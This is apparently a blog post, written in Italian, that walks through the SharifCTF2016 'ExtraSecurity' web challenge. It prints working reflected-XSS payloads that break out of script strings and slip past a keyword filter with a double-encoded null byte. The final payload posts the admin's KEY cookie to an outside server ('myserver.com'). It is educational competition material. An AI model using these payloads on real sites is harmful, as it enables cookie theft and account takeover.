---
layout: post
title:  "SharifCTF2016 - ExtraSecurity"
date:   2016-12-19 15:30
categories: CTF
tags: [Web,SharifCTF2016]
author: jbz
---


Questa sfida web richiedeva di fare 'firmare' all'utente amministratore del sito un numero.

![L'homepage della challenge](https://raw.githubusercontent.com/jbzteam/CTF/master/SharifCTF2016/ExtraSecurity/sharif_web_1.png)

Offriva la possibilita' di firmare con la propria chiava (impostata dal server in un cookie 'KEY') o di richiedere all'amministratore attraverso un form di effettuare la firma per noi. Dal testo non era chiaro quale fosse esattamente la strada da prendere: se fosse necessario rubare il cookie all'admin o se bastasse effettivamente utilizzare il form con qualche modifice.
Il testo specificava esplicitamente che l'admin avrebbe utilizzato Chrome per vedere le richieste e che quindi avrebbe filtrato le XSS.

Il primo problema consisteva nel fatto che nella propria pagina effettuare la firma, all'invio del form veniva visualizzato un popup di errore e si veniva reindirizzati prima di qualsiasi altra azione.

![Il popup di errore prima del reindirizzamento](https://raw.githubusercontent.com/jbzteam/CTF/master/SharifCTF2016/ExtraSecurity/sharif_web_4.png)

(http://ctf.sharif.edu:8083/wait_and_real_sign.php?content=259&id=<team_id>)

Dal sorgente pagina si puo' quindi notare questo codice:

```
<script>
    alert("Sorry, server is busy for a while!");
    document.location = "/index.php?id=eyJ0ZWFtaWQiOiIyNzkifS4xY0l4eEkud0pZRGN2QWdSMG03aGUxT0VmNEZiNHZjQThZ";
</script>
```
Che e' quello che causa la reindirizzazione.

Piu' in basso si nota anche il seguente codice, che pero' non viene eseguito:

```
<script>
    var timeElem = document.getElementById('time');
    waitSeconds(timeElem, function () {
        var c = parse(document.cookie || '');
        var key = c['KEY'];
        var body = {
            //content: base64Decode("MjU5"),
            content: "MjU5",
            key: key,
            id: 'eyJ0ZWFtaWQiOiIyNzkifS4xY0l4eEkud0pZRGN2QWdSMG03aGUxT0VmNEZiNHZjQThZ'
        };
        postForm('/sign_and_store.php', body);
    });
</script>
```

Con qualche test breve si intuisce subito che il campo GET 'id' puo' essere vulnerabile ad XSS ma che e' presente un filtro custom che filtra la maggior parte delle keyword o simboli: eval, alert, document, this sono solo alcuni dei filtri presenti. C'e' inoltre un limite di caratteri.

La nostra idea era quella di sfruttare la vulnerabilita' nel campo 'id', il cui contenuto viene riflesso sia nel primo script che nel secondo per rubare il cookie 'KEY' all'admin e effettuare la firma in autonomia.
Cerchiamo quindi un payload che fermi l'esecuzione del primo script e che ci permetta invece di modificare l'url di destinazione in poForm nel secondo, il tutto senza venire bloccati dal filtro di Chrome.

Il primo step e' trovare un modo per rompere il primo script ma non il secondo, e questo e' possibile grazie alla scelta degli organizzatori di usare apici doppi (") nel primo e apici singoli (') nel secondo.


`view-source:http://ctf.sharif.edu:8083/wait_and_real_sign.php?id=<team_id>};prompt(c['KEY']);a={'p%27:'"&content=1`

Questo payload contiene un apice doppio alla fine che rompe la sintassi del primo script, mentre chiude con un apice semplice il campo id nel secondo script, aggiunge prompt(c['KEY']) (equivalente di alert(c['KEY'] ma non filtrato), e crea un nuovo dict per completare la sintassi gia' esistente.

Risulta quindi

```<script>
        alert("Sorry, server is busy for a while!");
        document.location = "/index.php?id=eyJ0ZWFtaWQiOiIyNzkifS4xY0lybkIuelEtUy1QeFJ4WG9iV2U5NDZpOC1BQnY1Wkx3'};prompt(c['KEY']);a={'p':'"";
    </script>
<script>
    var timeElem = document.getElementById('time');
    waitSeconds(timeElem, function () {
        var c = parse(document.cookie || '');
        var key = c['KEY'];
        var body = {
            //content: base64Decode("MQ=="),
            content: "MQ==",
            key: key,
            id: 'eyJ0ZWFtaWQiOiIyNzkifS4xY0lybkIuelEtUy1QeFJ4WG9iV2U5NDZpOC1BQnY1Wkx3'};prompt(c['KEY']);a={'p':'"'
        };
        postForm('/sign_and_store.php', body);
    });
</script>

```
Il che conferma la spiegazione sopra.

![PoC](https://raw.githubusercontent.com/jbzteam/CTF/master/SharifCTF2016/ExtraSecurity/sharif_web_2.png)

Ora il grosso problema era il fatto che anche qualsiasi declinazione della parola 'post', 'xml' o simili facevano scattare il filtro, mentre altri tipi di offuscamento come jsfuck risultavano in una stringa troppo lunga.
Dopo diversi tentativi, supponendo che il filtro fosse realizzato applicativamente (e che quindi non ci fosse un WAF vero e proprio), ed essendo l'applicazione in PHP, iniziamo a provare inserendo null bytes %00 altri caratteri come %0a e %0d.
Il null byte funziona ed il filtro smette di funzionare per qualsiasi carattere/strings dopo la presenza di %00. Continuando nei test noto pero' che anche Chrome ha qualche problema nel gestire la sintassi in caso di null bytes nel sorgente (al momento del writeup non riesco a riprodurre il problema..), provo quindi effettuando un double encoding, cioe' inserendo %2500 e noto che funziona lo stesso. Il payload finale quindi consiste in:

`http://ctf.sharif.edu:8083/wait_and_real_sign.php?id=<team_id>'};%0a/*%2500*/%0apostForm('http://myserver.com/', body);});garbage(x, function () {a={'p':'"&content=1`

Che risulta nel seguente codice:

```
    <script>
        alert("Sorry, server is busy for a while!");
        document.location = "/index.php?id=eyJ0ZWFtaWQiOiIyNzkifS4xY0lybkIuelEtUy1QeFJ4WG9iV2U5NDZpOC1BQnY1Wkx3'};
/*%00*/
postForm('http://myserver.com/', body);});garbage(x, function () {a={'p':'"";
    </script>
<script>
    var timeElem = document.getElementById('time');
    waitSeconds(timeElem, function () {
        var c = parse(document.cookie || '');
        var key = c['KEY'];
        var body = {
            //content: base64Decode("MQ=="),
            content: "MQ==",
            key: key,
            id: 'eyJ0ZWFtaWQiOiIyNzkifS4xY0lybkIuelEtUy1QeFJ4WG9iV2U5NDZpOC1BQnY1Wkx3'};
/*%00*/
postForm('http://myserver.com/', body);});garbage(x, function () {a={'p':'"'
        };
        postForm('/sign_and_store.php', body);
    });
</script>

```

![Gli errori nella console dimostrano la mancata esecuzione del primo script e la corretta sintassi del secondo](https://raw.githubusercontent.com/jbzteam/CTF/master/SharifCTF2016/ExtraSecurity/sharif_web_3.png)

Da 'garbage' in poi il codice serve solo per non causare errori di sintassi.
Da notare che il filtro XSS di Chrome in questo scenario non viene mai condirato in quanto la XSS non richiede tag HTML poiche' il payload finisce gia' all'interno di tag <script>.

La richiesta di firma all'admin inviava una POST che conteneva un campo URL che lasciava intendere che fosse quello che l'admin avrebbe visitato per effettuare la firma. Bisognava quindi modificare quel campo con il payload descritto sopra.

Purtroppo non siamo riusciti a risolverla in tempo per ottenere il punteggio.
